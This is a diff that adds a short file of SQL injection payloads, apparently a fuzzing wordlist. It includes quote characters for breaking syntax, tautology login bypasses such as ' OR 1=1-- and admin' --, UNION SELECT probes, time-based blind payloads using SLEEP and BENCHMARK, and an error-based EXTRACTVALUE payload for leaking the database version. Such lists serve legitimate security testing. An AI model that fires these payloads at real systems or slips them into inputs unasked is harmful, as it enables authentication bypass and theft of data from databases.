@@ -1,0 +1,18 @@
+'
+"
+''
+`
+')
+"))
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin' --
+admin' #
+" OR "1"="1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5(1))--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
